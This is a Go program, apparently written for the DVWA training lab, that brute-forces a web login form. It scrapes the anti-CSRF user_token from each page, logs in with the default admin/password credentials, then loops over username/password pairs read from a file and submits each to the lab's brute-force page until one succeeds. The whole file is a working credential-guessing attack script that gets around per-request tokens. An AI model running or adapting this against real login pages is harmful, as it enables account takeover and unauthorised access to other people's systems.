package main

import (
    "fmt"
    "io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"bufio"
	"io"
	"os"
)

// 获取登录界面response报文，以及cookie
func GetContents(url string) (string ,string,error) {
    resp,err := http.Get(url)
    if err != nil {
        return "","",err
    }
    defer resp.Body.Close()
    if resp.StatusCode != http.StatusOK {
        return "", "",fmt.Errorf("get content failed status code is %d ",resp.StatusCode)
    }

	cookie1 := resp.Cookies()[0].Value

    bytes,err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return "" , "",nil
    }
    return string(bytes),string(cookie1),nil
}

// 解析报文，拿取csrf token
func GetToken(contents string) string{
	pattern := `<input type='hidden' name='user_token' value='(.*)' />`
	re := regexp.MustCompile(pattern)
	tokenList := re.FindAllStringSubmatch(contents,-1)
	var tk string
	for _,token := range tokenList{
		tk = token[1]
	}
	return tk
}

// 带cookie登录
func Postlogin(requrl string,loginToken string,befcook string) error{
	client := &http.Client{}
	params:=url.Values{}
	params.Add("username","admin")
	params.Add("password","password")
	params.Add("Login","Login")
	params.Add("user_token",loginToken)
	parmsenc := ioutil.NopCloser(strings.NewReader(params.Encode()))
	req, err := http.NewRequest("POST",requrl, parmsenc)
	if err != nil{
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cookie","PHPSESSID="+befcook+"; security=low")
	resp, err := client.Do(req)
	if err != nil{
		return nil
	}
	defer resp.Body.Close()	
	return nil
}

// 带cookie和token，读取文件，进行爆破
func fkwithcookie(cookstr string,fuckurl string,username string,password string) bool {
	client := &http.Client{};
	reqest, err := http.NewRequest("GET", fuckurl, nil)
	if err != nil{
		return false
	}
	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"high",HttpOnly:true};
	reqest.AddCookie(cookie2)
	reqest.AddCookie(cookie3)

	resp1,err := client.Do(reqest);
	if err != nil{
		return false
	}
	defer resp1.Body.Close()
	content1,_ := ioutil.ReadAll(resp1.Body)
	tokenfk := GetToken(string(content1))
	fuckurl2 := fuckurl + "?username="+username+"&password="+password+"&Login=Login&user_token="+tokenfk
	reqest2, err := http.NewRequest("GET", fuckurl2,nil)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return false
    }
	bd := string(body)
	if strings.LastIndex(bd, "incorrect") == -1{
		return true
	}
	return false
} 

func main() {
    urlDVWAlogin := "http://51da078c1db2c9d069ead893e0ccff56.n2.vsgo.cloud:6675/login.php"
	fuckUL := "http://51da078c1db2c9d069ead893e0ccff56.n2.vsgo.cloud:6675/vulnerabilities/brute/"
	contents1,befcook,err := GetContents(urlDVWAlogin)
    if err != nil {
        fmt.Println(err)
        return
    }
	loginToken := GetToken(contents1)
	Postlogin(urlDVWAlogin,loginToken,befcook)

	filepath := "./info.txt"
   	file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
   	if err != nil {
      	fmt.Println("Open file error!", err)
      	return
   	}
	defer file.Close()
	   
	buf := bufio.NewReader(file)
	
	count := 1
   	for {
      	line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		kv := strings.Split(line, " ")
		fmt.Printf("test%d:\nusername:%s\npassword:%s\n\n",count,kv[0],kv[1])
		count++
		if fkwithcookie(befcook,fuckUL,kv[0],kv[1]) == true{
			fmt.Println("Success!")
			break
		}
      	if err != nil {
         	if err == io.EOF {
            	fmt.Println("no pattern!")
            	break
         	} else {
            	fmt.Println("error!", err)
            	return
         	}
      	}
   	}
}